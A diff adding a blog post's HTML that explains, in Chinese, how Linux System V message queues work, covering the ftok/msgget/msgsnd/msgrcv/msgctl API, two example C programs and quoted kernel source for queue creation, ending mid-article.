@@ -156,6 +156,298 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/19/Principles%EF%BC%9Amsg%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/19/Principles%EF%BC%9Amsg%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Principles：msg底层原理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-09-19 20:58:41 / Modified: 21:00:33" itemprop="dateCreated datePublished" datetime="2022-09-19T20:58:41+08:00">2022-09-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>14k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>13 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>msg 简述</strong></p>
+<p>消息队列，是消息的链接表，存放在内核中，一个消息队列由一个标识符（即ID）来标识</p>
+<ul>
+<li>消息队列的标识符 key 键，它的基本类型是 key_t，使用 <code>ftok</code> 函数可以生成一个 key_t</li>
+<li>两个无关的进程，可以通过唯一标识符 key 来找到对应的 msg</li>
+</ul>
+<img src="/2022/09/19/Principles%EF%BC%9Amsg%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1663569472621.png" class width="1663569472621"> 
+<p>共享内存，消息队列，信号量它们三个都是找一个中间介质来进行通信的，就是文件的设备编号和节点，<code>ftok()</code> 就可以通过“文件路径”来获取一个 key_t 键值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 系统IPC键值的格式转换函数 */</span></span><br><span class="line"><span class="function"><span class="keyword">key_t</span> <span class="title">ftok</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * fname, <span class="keyword">int</span> id)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>fname：<ul>
+<li>指定的文件名，这个文件必须是存在的而且可以访问的</li>
+<li>只是根据文件 inode 在系统内的唯一性来取一个数值，和文件的权限无关 </li>
+</ul>
+</li>
+<li>id：<ul>
+<li>子序号，它是一个8bit的整数，即范围是0~255 </li>
+<li>可以根据自己的约定，随意设置</li>
+</ul>
+</li>
+<li>return：<ul>
+<li>成功：返回 key_t 键值 </li>
+<li>出错：返回 “-1”</li>
+</ul>
+</li>
+</ul>
+<p><strong>msg API</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 创建或打开消息队列:成功返回队列ID,失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span>; </span><br></pre></td></tr></table></figure>
+<ul>
+<li>key：<ul>
+<li>IPC_PRIVATE - “0”：会建立新的消息队列（只能单进程通信，不能在两个进程之间进行通信）</li>
+<li>大于0的32位整数：视参数 msgflg 来确定操作，通常要求此值来源于 ftok 返回的 IPC 键值</li>
+</ul>
+</li>
+<li>msgflg：<ul>
+<li>“0”：取消息队列标识符，若不存在则函数会报错</li>
+<li>IPC_CREAT：如果内核中不存在键值与 key 相等的消息队列，则新建一个消息队列，如果存在这样的消息队列，返回此消息队列的标识符 </li>
+<li>IPC_CREAT | IPC_EXCL：如果内核中不存在键值与 key 相等的消息队列，则新建一个消息队列，如果存在这样的消息队列则报错 </li>
+</ul>
+</li>
+<li>return：<ul>
+<li>成功：返回消息队列的标识符 </li>
+<li>出错：返回 “-1”，错误原因存于 error 中</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 添加消息:成功返回0,失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">const</span> <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>msqid：<ul>
+<li>消息队列标识符 </li>
+</ul>
+</li>
+<li>msgp：<ul>
+<li>发送给队列的消息</li>
+<li>msgp 可以是任何类型的结构体，但第一个字段必须为 long 类型，即表明此发送消息的类型</li>
+</ul>
+</li>
+<li>msgsz：<ul>
+<li>要发送消息的大小（不含消息类型占用的4个字节）</li>
+</ul>
+</li>
+<li>msgflg：<ul>
+<li>“0”：当消息队列满时，msgsnd 将会阻塞，直到消息能写进消息队列</li>
+<li>IPC_NOWAIT：当消息队列已满的时候，msgsnd 函数不等待立即返回</li>
+<li>MSG_NOERROR：若发送的消息大于 size 字节，则把该消息截断，截断部分将被丢弃，且不通知发送进程</li>
+</ul>
+</li>
+<li>return：<ul>
+<li>成功：返回 “0” </li>
+<li>出错：返回 “-1”，错误原因存于 error 中</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 读取消息:成功返回消息数据的长度,失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>msqid：<ul>
+<li>消息队列标识符 </li>
+</ul>
+</li>
+<li>msgp：<ul>
+<li>存放消息的结构体</li>
+<li>结构体类型要与 msgsnd 函数发送的类型相同</li>
+</ul>
+</li>
+<li>msgsz：<ul>
+<li>要接收消息的大小（不含消息类型占用的4个字节）</li>
+</ul>
+</li>
+<li>msgtyp：<ul>
+<li>“0”：接收第一个消息 </li>
+<li>大于零：接收类型等于 msgtyp 的第一个消息 </li>
+<li>小于零：接收类型等于或者小于 msgtyp 绝对值的第一个消息 </li>
+</ul>
+</li>
+<li>msgflg：<ul>
+<li>“0”：阻塞式接收消息，没有该类型的消息 msgrcv 函数一直阻塞等待</li>
+<li>IPC_NOWAIT：如果没有符合条件的 msg 则立即返回“-1”，此时错误码为 ENOMSG </li>
+<li>MSG_COPY：内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</li>
+<li>MSG_EXCEPT：返回队列中第一个类型不为 msgtype 的消息 </li>
+<li>MSG_NOERROR：如果队列中满足条件的消息内容大于所请求的 size 字节，则把该消息截断，截断部分将被丢弃</li>
+</ul>
+</li>
+<li>return：<ul>
+<li>成功：返回 “0” </li>
+<li>出错：返回 “-1”，错误原因存于 error 中</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 控制消息队列:成功返回0,失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgctl</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">int</span> cmd, struct msqid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>msqid：<ul>
+<li>消息队列标识符 </li>
+</ul>
+</li>
+<li>cmd：<ul>
+<li>IPC_STAT：获得 msgid 的消息队列头数据到 buf 中</li>
+<li>IPC_SET：设置消息队列的属性，要设置的属性需先存储在 buf 中，可设置的属性包括：<ul>
+<li>msg_perm.uid、msg_perm.gid、msg_perm.mode 以及 msg_qbytes </li>
+</ul>
+</li>
+</ul>
+</li>
+<li>return：<ul>
+<li>成功：“0” </li>
+<li>出错：“-1”，错误原因存于 error 中</li>
+</ul>
+</li>
+</ul>
+<p><strong>msg 使用案例</strong></p>
+<p>read.c 文件：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span>&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;       <span class="comment">/* message type, must be &gt; 0 */</span></span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">128</span>];    <span class="comment">/* message data */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> <span class="title">sendbuf</span>=</span>&#123;<span class="number">999</span>,<span class="string">&quot;888 message already received&quot;</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> <span class="title">readbuf</span>;</span></span><br><span class="line">        <span class="keyword">int</span> msgid = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">key_t</span> key;</span><br><span class="line">        key = ftok(<span class="string">&quot;.&quot;</span>,<span class="string">&#x27;z&#x27;</span>);<span class="comment">//获取键值</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;key=%x\n&quot;</span>,key);</span><br><span class="line">        msgid=msgget(key,IPC_CREAT|<span class="number">0777</span>);<span class="comment">//在内核中打开或建立键值为key的，权限为0777的消息队列</span></span><br><span class="line">        <span class="keyword">if</span>(msgid == <span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;create msgq failure\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        msgrcv(msgid,&amp;readbuf,<span class="keyword">sizeof</span>(readbuf.mtext),<span class="number">888</span>,<span class="number">0</span>);<span class="comment">//从队列中获取888类型的数据，如果队列中未出现888类型的数据，则程序阻塞在这里</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;read from que:%s\n&quot;</span>,readbuf.mtext);</span><br><span class="line">        msgsnd(msgid,&amp;sendbuf,<span class="built_in">strlen</span>(sendbuf.mtext),<span class="number">0</span>);<span class="comment">//往队列id为msgid的队列写入sendbuf(类型为999)数据</span></span><br><span class="line">        msgctl(msgid,IPC_RMID,<span class="literal">NULL</span>);<span class="comment">//将队列从系统内核中删除</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>send.c 文件：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span>&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;       <span class="comment">/* message type, must be &gt; 0 */</span></span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">128</span>];    <span class="comment">/* message data */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> <span class="title">sendbuf</span>=</span>&#123;<span class="number">888</span>,<span class="string">&quot;this is message from que&quot;</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> <span class="title">readbuf</span>;</span></span><br><span class="line">        <span class="keyword">int</span> msgid= <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">key_t</span> key;</span><br><span class="line">        key = ftok(<span class="string">&quot;.&quot;</span>,<span class="string">&#x27;z&#x27;</span>);<span class="comment">//获取键值</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;key=%x\n&quot;</span>,key);</span><br><span class="line">        msgid=msgget(key,IPC_CREAT|<span class="number">0777</span>);<span class="comment">//在内核中打开或建立键值为key的，权限为0777的消息队列</span></span><br><span class="line">        <span class="keyword">if</span>(msgid == <span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;create msgq failure\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        msgsnd(msgid,&amp;sendbuf,<span class="built_in">strlen</span>(sendbuf.mtext),<span class="number">0</span>);<span class="comment">//往队列id为msgid的队列写入sendbuf(类型为888)数据</span></span><br><span class="line">        msgrcv(msgid,&amp;readbuf,<span class="keyword">sizeof</span>(readbuf.mtext),<span class="number">999</span>,<span class="number">0</span>);<span class="comment">//从队列中获取999类型的数据，如果队列中未出现999类型的数据，则程序阻塞在这里</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,readbuf.mtext);</span><br><span class="line">        msgctl(msgid,IPC_RMID,<span class="literal">NULL</span>);<span class="comment">//将队列从系统内核中删除</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./read </span><br><span class="line">key=<span class="number">7</span>a05274f <span class="comment">/* 获取同一个key */</span></span><br><span class="line">read from que:<span class="keyword">this</span> is message from que </span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./send          </span><br><span class="line">key=<span class="number">7</span>a05274f <span class="comment">/* 获取同一个key */</span></span><br><span class="line"><span class="number">888</span> message already received</span><br></pre></td></tr></table></figure>
+<ul>
+<li>如果只在同一个进程中传递信息，则不提供 key 也可以</li>
+</ul>
+<p><strong>Linux 中 msg 的实现</strong></p>
+<p>创建或打开消息队列 <code>msgget</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ee3019</span> &lt;msgget+<span class="number">9</span>&gt;        syscall  &lt;SYS_msgget&gt;</span><br><span class="line">       key: <span class="number">0x7a05274f</span></span><br><span class="line">       msgflg: <span class="number">0x3ff</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>用户态的底层就是一个 syscall</li>
+<li>内核态中就是以下这个函数：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_ops</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*getnew)(struct ipc_namespace *, struct ipc_params *);</span><br><span class="line">	<span class="keyword">int</span> (*associate)(struct kern_ipc_perm *, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*more_checks)(struct kern_ipc_perm *, struct ipc_params *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipc_ops</span> <span class="title">msg_ops</span> =</span> &#123;</span><br><span class="line">		.getnew = newque,</span><br><span class="line">		.associate = security_msg_queue_associate,</span><br><span class="line">	&#125;; <span class="comment">/* 初始化&quot;创建例程&quot; */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_params</span> <span class="title">msg_params</span>;</span></span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns; <span class="comment">/* 获取当前IPC命名空间 */</span></span><br><span class="line"></span><br><span class="line">	msg_params.key = key; <span class="comment">/* 键值 */</span></span><br><span class="line">	msg_params.flg = msgflg; <span class="comment">/* 标识符 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ipcget(ns, &amp;msg_ids(ns), &amp;msg_ops, &amp;msg_params); <span class="comment">/* 核心函数 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ipcget</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (params-&gt;key == IPC_PRIVATE) <span class="comment">/* 是否私有 */</span></span><br><span class="line">		<span class="keyword">return</span> ipcget_new(ns, ids, ops, params); <span class="comment">/* 创建一个新的ipc对象 */</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> ipcget_public(ns, ids, ops, params); <span class="comment">/* 获取一个ipc对象或创建一个新对象 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ipcget_new</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// *ns: ipc命名空间</span></span><br><span class="line">    <span class="comment">// *ids: ipc标识符集</span></span><br><span class="line">    <span class="comment">// *ops: 要调用的实际创建例程</span></span><br><span class="line">    <span class="comment">// *params: 它的参数</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	down_write(&amp;ids-&gt;rwsem); <span class="comment">/* 写者申请[得到]读写信号量sem时调用 */</span></span><br><span class="line">	err = ops-&gt;getnew(ns, params); <span class="comment">/* 其实就是执行了&quot;创建例程&quot;中的newque */</span></span><br><span class="line">	up_write(&amp;ids-&gt;rwsem); <span class="comment">/* 写者[释放]读写信号量sem时调用 */</span></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>前面这些可以说是 “共享内存”，“信号量”，“消息队列” 的通用部分，只是 <code>ipc_ops</code> 结构体的初始化不同</li>
+<li>其实这里可以看出一点面向对象的思想了</li>
+<li>函数 <code>newque</code> 的源码如下：（创建一个新的消息队列）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="comment">// *ns: 命名空间</span></span><br><span class="line">    <span class="comment">// *params: 指向包含key和msgflg的结构体(ipc_params)</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL); <span class="comment">/* 为msg_queue分配内核堆空间 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	</span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm); <span class="comment">/* 将msg_queue添加到消息队列基数树中,并取回基数树id */</span></span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni); <span class="comment">/* 新创建的msg_queue结构挂到msg_ids里面的基数树上 */</span></span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free); <span class="comment">/* 释放目标 */</span></span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>msgget</code> 会在内核堆空间中创建一个 <code>msg_queue</code> 结构体：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
+<ul>
